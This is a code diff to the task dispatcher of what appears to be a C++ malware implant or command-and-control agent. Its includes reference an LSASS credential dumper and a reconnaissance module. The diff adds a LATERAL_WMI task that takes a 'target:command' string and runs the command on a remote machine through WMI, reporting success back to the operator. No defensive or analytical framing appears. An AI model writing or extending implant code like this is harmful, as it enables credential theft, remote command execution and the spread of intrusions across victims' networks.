@@ -17,6 +17,7 @@
 #include "../credential/LsassDumper.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
+#include "../modules/Lateral.h"
 #include "../crypto/Base64.h"
 #include "../utils/Logger.h"
 #include <stdexcept>
@@ -268,6 +269,25 @@ void TaskDispatcher::dispatch(const Task& task) {
             case TaskType::GET_LOGS:
                 result.output = "LOGS:" + utils::Logger::GetRecentLogs(200);
                 break;
+            case TaskType::LATERAL_WMI: {
+                // Cmd format: "target:command"
+                size_t colon = task.cmd.find(':');
+                if (colon != std::string::npos) {
+                    std::string target_s = task.cmd.substr(0, colon);
+                    std::string cmd_s = task.cmd.substr(colon + 1);
+                    std::wstring target_ws(target_s.begin(), target_s.end());
+                    std::wstring cmd_ws(cmd_s.begin(), cmd_s.end());
+
+                    if (Lateral::WmiRemoteExec(target_ws, cmd_ws)) {
+                        result.output = "LATERAL_WMI:Successfully executed on " + target_s;
+                    } else {
+                        result.error = "LATERAL_WMI:Failed to execute on " + target_s;
+                    }
+                } else {
+                    result.error = "Invalid lateral_wmi command format (expected target:command)";
+                }
+                break;
+            }
             default:
                 result.error = "Unknown or unsupported task type.";
                 LOG_WARN("Unsupported task type received: " + task.task_id);
